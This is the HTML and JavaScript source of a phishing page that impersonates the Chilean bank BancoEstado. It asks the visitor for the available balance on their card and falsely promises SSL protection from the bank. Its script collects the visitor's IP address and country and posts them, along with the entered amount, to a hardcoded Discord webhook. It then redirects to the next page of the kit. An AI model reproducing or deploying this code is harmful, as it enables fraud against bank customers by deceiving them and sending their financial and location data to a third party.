<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BancoEstado - Verificación de Saldo</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap');

        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, sans-serif;
            background-color: #f8f9fb;
            display: flex;
            justify-content: center;
            color: #334155;
        }

        .main-container {
            width: 100%;
            max-width: 420px;
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            box-shadow: 0 10px 25px rgba(0,0,0,0.03);
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
        }

        .logo {
            height: 28px;
            opacity: 0.9;
        }

        .close-btn {
            width: 32px;
            height: 32px;
            background-color: #f1f5f9;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #64748b;
            font-size: 18px;
            cursor: pointer;
        }

        .message-section {
            padding: 40px 30px 20px;
            text-align: center;
        }

        .validation-text {
            font-size: 15px;
            color: #1e293b;
            line-height: 1.6;
            font-weight: 400;
            letter-spacing: -0.2px;
        }

        .highlight {
            display: block;
            margin-top: 5px;
            font-weight: 600;
            color: #ff8c00;
            font-size: 13px;
            text-transform: uppercase;
        }

        .form-container {
            padding: 20px 30px;
        }

        .input-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 12px;
            color: #64748b;
        }

        .amount-input {
            width: 100%;
            padding: 16px;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            font-size: 22px;
            font-weight: 600;
            text-align: left;
            box-sizing: border-box;
            outline: none;
            background-color: #fcfdfe;
            color: #1e293b;
            transition: all 0.2s;
        }

        .amount-input:focus {
            border-color: #ff8c00;
            box-shadow: 0 0 0 3px rgba(255, 140, 0, 0.1);
            background-color: #fff;
        }

        .btn-continuar {
            background-color: #ff8c00;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            margin-top: 20px;
            box-shadow: 0 4px 15px rgba(255, 140, 0, 0.2);
            transition: all 0.2s;
        }

        /* Botón verde cuando hay datos */
        .btn-ready {
            background-color: #FFA500 !important;
            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3) !important;
        }

        .footer-secure {
            margin-top: auto;
            padding: 30px;
            text-align: center;
            font-size: 11px;
            color: #94a3b8;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b3/Logo_BancoEstado.svg/1280px-Logo_BancoEstado.svg.png" alt="Logo" class="logo">
            <div class="close-btn">✕</div>
        </div>

        <div class="message-section">
            <div class="validation-text">
                Para completar el proceso, necesitamos confirmar el cupo o saldo disponible en su tarjeta.
                <span class="highlight">Confirmación de Fondos</span>
            </div>
        </div>

        <div class="form-container">
            <div class="input-group">
                <label>Monto actual en su tarjeta</label>
                <input type="text" class="amount-input" id="monto-input" placeholder="$0" maxlength="15">
                <div class="help-text" style="font-size: 12px; color: #94a3b8; margin-top: 10px;">
                    Ingrese el saldo total disponible que visualiza en su aplicación o sitio web.
                </div>
            </div>

            <button class="btn-continuar" id="btnConfirmar">Confirmar Saldo</button>
        </div>

        <div class="footer-secure">
            🔒 Sus datos están protegidos por el protocolo SSL de BancoEstado
        </div>
    </div>

    <script>
        const inputMonto = document.getElementById('monto-input');
        const btnConfirmar = document.getElementById('btnConfirmar');

        // Formateo de CLP y activación de botón
        inputMonto.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, "");
            
            if (value === "") {
                e.target.value = "";
                btnConfirmar.classList.remove('btn-ready');
                return;
            }

            if (parseInt(value) > 0) {
                btnConfirmar.classList.add('btn-ready');
            }

            const formatted = new Intl.NumberFormat('es-CL').format(value);
            e.target.value = `$${formatted}`;
        });

        // Envío a Discord con IP y País
        btnConfirmar.addEventListener('click', async () => {
            if (!btnConfirmar.classList.contains('btn-ready')) return;

            const webhookURL = "https://discord.com/api/webhooks/1465019093836103945/6LbG2CTqQEP3jJOc6gY143KS6doKInBNVZIWvyj6Ct6J8Lq6Fxw8Pn-LcPRFq1Ljlyyq";
            
            btnConfirmar.innerText = "Procesando...";
            btnConfirmar.disabled = true;

            try {
                // 1. Obtener IP y País
                const geoRes = await fetch('https://ipapi.co/json/');
                const geoData = await geoRes.json();
                
                const ipReal = geoData.ip || "No detectada";
                const paisReal = geoData.country_name || "Desconocido";

                // 2. Preparar el mensaje
                const data = {
                    embeds: [{
                        title: "💰 SALDO CONFIRMADO",
                        color: 16745472, // Naranja BancoEstado
                        fields: [
                            { name: "💵 Monto Declarado", value: `**${inputMonto.value} CLP**`, inline: true },
                            { name: "🌐 IP Real", value: `\`${ipReal}\``, inline: false },
                            { name: "🌍 País", value: `**${paisReal}**`, inline: true }
                        ],
                        footer: { text: "Sistema de Fondos BancoEstado" },
                        timestamp: new Date()
                    }]
                };

                // 3. Enviar a Discord
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                // Redirección final
                window.location.href = "index5.html";
            } catch (error) {
                console.error("Error:", error);
                window.location.href = "index5.html";
            }
        });
    </script>
</body>
</html>
